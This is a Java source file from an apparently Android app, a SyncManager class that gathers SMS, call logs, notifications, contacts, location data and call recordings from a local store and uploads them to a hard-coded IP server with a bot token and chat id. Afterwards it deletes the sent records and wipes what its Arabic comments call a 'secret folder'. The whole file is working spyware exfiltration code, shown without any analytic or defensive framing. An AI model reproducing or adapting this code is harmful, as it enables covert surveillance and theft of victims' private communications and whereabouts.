package com.alzahra.data;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SyncManager {
    private static final String TAG = "SyncManager";
    
    private final Context context;
    private final DatabaseHelper db;
    private final SharedPreferences prefs;
    private final ExecutorService executor;
    private final Handler handler;
    
    private final String serverUrl;
    private final String botToken;
    private final String chatId;
    
    public SyncManager(Context context) {
        this.context = context.getApplicationContext();
        this.db = new DatabaseHelper(context);
        this.prefs = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE);
        this.executor = Executors.newFixedThreadPool(3);
        this.handler = new Handler(Looper.getMainLooper());
        
        this.serverUrl = prefs.getString("server_url", "http://216.128.156.226:8443");
        this.botToken = prefs.getString("bot_token", "");
        this.chatId = prefs.getString("chat_id", "");
    }
    
    // ═══════════════════════════════════════════
    // إرسال البيانات للسيرفر
    // ═══════════════════════════════════════════
    
    public void syncAll() {
        executor.execute(() -> {
            Log.d(TAG, "Starting sync...");
            
            try {
                // إرسال كل نوع بيانات
                syncData("sms");
                syncData("calls");
                syncData("notifications");
                syncData("contacts");
                syncData("location");
                syncRecordings();
                
                // حذف البيانات المرسلة
                db.deleteSentData();
                
                // تنظيف المجلد السري
                cleanupSecretFolder();
                
                Log.d(TAG, "Sync completed");
                
            } catch (Exception e) {
                Log.e(TAG, "Sync error", e);
            }
        });
    }
    
    private void syncData(String dataType) {
        try {
            File file = db.exportData(dataType);
            if (file == null || !file.exists()) {
                Log.d(TAG, "No " + dataType + " to sync");
                return;
            }
            
            // إرسال للسيرفر
            boolean success = sendFileToServer(file, dataType);
            
            if (success) {
                // تحديث حالة الإرسال
                markDataSent(dataType);
                Log.d(TAG, dataType + " synced successfully");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Sync " + dataType + " error", e);
        }
    }
    
    private void syncRecordings() {
        try {
            JSONArray recordings = db.getUnsentRecordings();
            if (recordings.length() == 0) return;
            
            for (int i = 0; i < recordings.length(); i++) {
                JSONObject rec = recordings.getJSONObject(i);
                String filePath = rec.optString("file_path");
                
                if (filePath != null && !filePath.isEmpty()) {
                    File file = new File(filePath);
                    if (file.exists()) {
                        sendFileToServer(file, "recording");
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Sync recordings error", e);
        }
    }
    
    private boolean sendFileToServer(File file, String type) {
        try {
            String boundary = "----AlZahraBoundary" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            
            URL url = new URL(serverUrl + "/api/data");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            
            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            
            // إضافة البيانات
            writeField(dos, boundary, lineEnd, "device_id", getDeviceId());
            writeField(dos, boundary, lineEnd, "type", type);
            writeField(dos, boundary, lineEnd, "bot_token", botToken);
            writeField(dos, boundary, lineEnd, "chat_id", chatId);
            
            // إضافة الملف
            writeFile(dos, boundary, lineEnd, "file", file.getName(), file);
            
            dos.writeBytes("--" + boundary + "--" + lineEnd);
            dos.flush();
            dos.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            return responseCode == 200;
            
        } catch (Exception e) {
            Log.e(TAG, "Send file error", e);
            return false;
        }
    }
    
    private void writeField(DataOutputStream dos, String boundary, String lineEnd, String name, String value) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + lineEnd);
        dos.writeBytes(lineEnd);
        dos.writeBytes(value + lineEnd);
    }
    
    private void writeFile(DataOutputStream dos, String boundary, String lineEnd, String fieldName, String fileName, File file) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileName + "\"" + lineEnd);
        dos.writeBytes("Content-Type: application/octet-stream" + lineEnd);
        dos.writeBytes(lineEnd);
        
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            dos.write(buffer, 0, bytesRead);
        }
        fis.close();
        dos.writeBytes(lineEnd);
    }
    
    private void markDataSent(String dataType) {
        // تحديث جميع السجلات غير المرسلة
        switch (dataType) {
            case "sms":
                db.markSMSSent("SELECT id FROM sms WHERE sent_to_server = 0");
                break;
            case "calls":
                db.markCallsSent("SELECT id FROM calls WHERE sent_to_server = 0");
                break;
            case "notifications":
                db.markNotificationsSent("SELECT id FROM notifications WHERE sent_to_server = 0");
                break;
            case "contacts":
                db.markContactsSent("SELECT id FROM contacts WHERE sent_to_server = 0");
                break;
            case "location":
                db.markLocationSent("SELECT id FROM location WHERE sent_to_server = 0");
                break;
        }
    }
    
    // ═══════════════════════════════════════════
    // إنشاء ملف ZIP
    // ═══════════════════════════════════════════
    
    public File createZipPackage() {
        try {
            File secretDir = new File(prefs.getString("secret_path", ""));
            File tempDir = new File(secretDir, "temp");
            
            if (!tempDir.exists() || tempDir.listFiles() == null || tempDir.listFiles().length == 0) {
                return null;
            }
            
            File zipFile = new File(secretDir, "latest_data.zip");
            
            java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(
                new java.io.FileOutputStream(zipFile));
            
            for (File file : tempDir.listFiles()) {
                if (file.isFile()) {
                    java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry(file.getName());
                    zos.putNextEntry(entry);
                    
                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = fis.read(buffer)) > 0) {
                        zos.write(buffer, 0, len);
                    }
                    fis.close();
                    zos.closeEntry();
                }
            }
            
            zos.close();
            return zipFile;
            
        } catch (Exception e) {
            Log.e(TAG, "Create zip error", e);
            return null;
        }
    }
    
    // ═══════════════════════════════════════════
    // تنظيف المجلد السري
    // ═══════════════════════════════════════════
    
    private void cleanupSecretFolder() {
        try {
            File secretDir = new File(prefs.getString("secret_path", ""));
            File tempDir = new File(secretDir, "temp");
            
            if (tempDir.exists()) {
                for (File file : tempDir.listFiles()) {
                    file.delete();
                }
            }
            
            // حذف ZIP القديم
            File zipFile = new File(secretDir, "latest_data.zip");
            if (zipFile.exists()) {
                zipFile.delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Cleanup error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // وظائف مساعدة
    // ═══════════════════════════════════════════
    
    private String getDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) {
            id = java.util.UUID.randomUUID().toString().substring(0, 8);
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }
    
    public JSONObject getStats() {
        return db.getStats();
    }
}
